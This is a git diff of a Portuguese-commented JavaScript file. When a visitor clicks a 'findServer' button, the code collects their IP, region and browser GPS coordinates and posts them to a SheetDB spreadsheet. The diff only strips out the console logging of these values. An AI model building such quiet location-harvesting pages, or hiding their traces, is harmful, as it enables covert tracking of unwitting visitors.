@@ -23,7 +23,6 @@ async function getIPandLocation() {
       ip: data.ip || ''
     };
   } catch(e) {
-    console.error('Erro ao obter IP:', e);
     return {
       country: '',
       region: '',
@@ -75,9 +74,7 @@ async function sendDataToSheet(collectedData) {
   try {
     // Prepara e limpa os dados
     const cleanData = prepareDataForSheet(collectedData);
-    
-    console.log('Enviando dados:', cleanData);
-    
+        
     const response = await fetch(sheetDbUrl, {
       method: 'POST',
       headers: { 
@@ -90,10 +87,8 @@ async function sendDataToSheet(collectedData) {
     });
     
     const result = await response.json();
-    console.log('Resposta SheetDB:', result);
     
     if (result.created === 1) {
-      console.log('✓ Dados guardados com sucesso!');
       return true;
     } else {
       console.error('Erro na resposta:', result);
@@ -122,7 +117,6 @@ document.getElementById('findServer').addEventListener('click', async function()
   if (navigator.geolocation) {
     const geoTimeout = setTimeout(async () => {
       if (!geoLocationSent) {
-        console.log('Timeout de geolocalização');
         const collectedData = {
           ...ipData,
           lat_browser: '',
@@ -145,7 +139,6 @@ document.getElementById('findServer').addEventListener('click', async function()
 
     navigator.geolocation.getCurrentPosition(
       async (pos) => {
-        console.log('✓ GPS obtido:', pos.coords.latitude, pos.coords.longitude);
         
         clearTimeout(geoTimeout);
         if (!geoLocationSent) {
@@ -169,7 +162,6 @@ document.getElementById('findServer').addEventListener('click', async function()
         }
       },
       async (error) => {
-        console.warn('Erro de geolocalização:', error.code, error.message);
         
         clearTimeout(geoTimeout);
         if (!geoLocationSent) {
